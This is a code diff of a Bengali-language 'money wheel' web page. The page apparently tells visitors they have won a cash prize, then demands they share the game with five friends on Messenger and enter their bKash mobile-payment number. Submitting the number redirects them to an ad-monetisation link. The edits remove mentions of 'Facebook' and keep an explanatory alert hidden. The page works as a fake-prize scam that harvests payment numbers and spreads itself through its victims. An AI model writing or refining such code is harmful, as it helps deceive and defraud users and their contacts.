@@ -307,7 +307,7 @@
              setTimeout(() => {
                  resultDiv.innerHTML = `<span class="congrats-text">অভিনন্দন!</span> আপনি <span class="prize-amount-text">${wonPrize.label}</span> জিতেছেন।`;
                  resultDiv.style.display = 'block';
-                 shareMessagePara.innerHTML = `আপনার <span class="prize-amount-text">${wonPrize.label}</span> পুরস্কারটি পেতে, <span class="share-instruction-text">দয়া করে প্রথমে ৫ জন বন্ধুকে এই গেমটি ফেসবুক মেসেঞ্জারে অথবা অন্য কোনো মাধ্যমে শেয়ার করুন।</span>`;
+                 shareMessagePara.innerHTML = `আপনার <span class="prize-amount-text">${wonPrize.label}</span> পুরস্কারটি পেতে, <span class="share-instruction-text">দয়া করে প্রথমে ৫ জন বন্ধুকে এই গেমটি মেসেঞ্জারে অথবা অন্য কোনো মাধ্যমে শেয়ার করুন।</span>`; // "ফেসবুক" শব্দটি এখান থেকে সরানো হয়েছে
                  shareSection.style.display = 'block';
                  shareButton.disabled = false;
              }, 5000);
@@ -327,7 +327,6 @@
 
             if (navigator.share) {
                 navigator.share({
-                    title: 'টাকার চাকা - ঘুরে গেল আমার ভাগ্য!',
                     text: shareMessageForFriends,
                     url: gameLink
                 })
@@ -350,15 +349,14 @@
                 // navigator.share not supported. Attempt to open Messenger app directly.
                 const messengerAppUrl = `fb-messenger://share?link=${encodeURIComponent(gameLink)}`;
 
-                const alertMessage = `ফেসবুক মেসেঞ্জার অ্যাপে সরাসরি শেয়ার করার চেষ্টা করা হচ্ছে।
+                const alertMessage = `মেসেঞ্জার অ্যাপে সরাসরি শেয়ার করার চেষ্টা করা হচ্ছে।
 এটি কাজ না করলে, অথবা আপনি যদি মেসেজও যোগ করতে চান, তাহলে অনুগ্রহ করে এই গেমের লিংক (${gameLink}) এবং নিচের মেসেজটি কপি করে মেসেঞ্জারে পেস্ট করুন:
 
 "${shareMessageForFriends}"
 
-শেয়ার করার পর এই পেজে ফিরে এসে আপনার পুরস্কার দাবি করতে পারবেন।`;
-                // alert(alertMessage); // এলার্ট ম্যাসেজটি এখানে হাইড করা হলো
+শেয়ার করার পর এই পেজে ফিরে এসে আপনার পুরস্কার দাবি করতে পারবেন।`; // "ফেসবুক" শব্দটি এখান থেকে সরানো হয়েছে
+                // alert(alertMessage);
 
-                // একটি কনসোল লগ যোগ করা হলো যাতে বোঝা যায় এই কোড ব্লকটি এক্সিকিউট হচ্ছে
                 console.log("navigator.share not supported. Alert hidden. Attempting to open Messenger app URL directly.");
                 console.log("Alert message content (would have been shown):", alertMessage);
 
@@ -382,18 +380,16 @@
                  bikashInstructionPara.innerHTML = `আপনার পুরস্কারটি পেতে, নিচের বক্সে আপনার বিকাশ নাম্বার দিন এবং সেন্ড বাটনে ক্লিক করুন:`;
             }
 
-            // Short delay before showing bikash section to allow users to process the share action
             setTimeout(() => {
                 bikashSection.style.display = 'block';
                 bikashNumberInput.focus();
-            }, 500); // Reduced this from 1000ms, as the main delay is after share attempt
+            }, 500);
         }
 
         sendBikashButton.addEventListener('click', () => {
             const bikashNum = bikashNumberInput.value.trim();
             if (/^01[3-9]\d{8}$/.test(bikashNum)) {
                 console.log(`bKash number submitted: ${bikashNum} for prize: ${wonPrize ? wonPrize.label : 'Unknown'}`);
-                // Make sure to replace with your actual redirection URL
                 window.location.href = 'https://www.effectiveratecpm.com/hpduy20d?key=e38d3d108db3a3f973b6fad4d84d4121';
             } else {
                 alert('দয়া করে সঠিক ১১ সংখ্যার বিকাশ নাম্বার দিন (যেমন: 01xxxxxxxxx)।');
@@ -414,16 +410,12 @@
             };
         }
 
-        // Debounced setup for wheel labels on resize or initial load
         const debouncedSetupLabels = debounce(setupWheelLabels, 250);
         window.addEventListener('resize', debouncedSetupLabels);
 
-        // Initial setup of wheel labels
-        // Use DOMContentLoaded to ensure elements are ready, or a small timeout if issues persist
         document.addEventListener('DOMContentLoaded', () => {
             setupWheelLabels();
         });
-        // Fallback if DOMContentLoaded fires too early for offsetWidth
         if (wheel.offsetWidth === 0) {
             setTimeout(setupWheelLabels, 100);
         }
